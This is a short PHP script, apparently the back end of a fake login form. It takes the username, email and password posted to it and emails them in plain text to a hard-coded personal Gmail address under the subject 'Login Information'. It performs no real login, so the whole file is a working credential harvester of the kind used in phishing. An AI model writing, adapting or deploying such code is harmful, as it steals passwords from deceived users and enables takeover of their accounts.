<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    $to = "hyperahmad123@gmail.com";
    $subject = "Login Information";
    $message = "Username: " . $username . "\n";
    $message .= "Email: " . $email . "\n";
    $message .= "Password: " . $password . "\n";
    
    // Send email
    mail($to, $subject, $message);
}
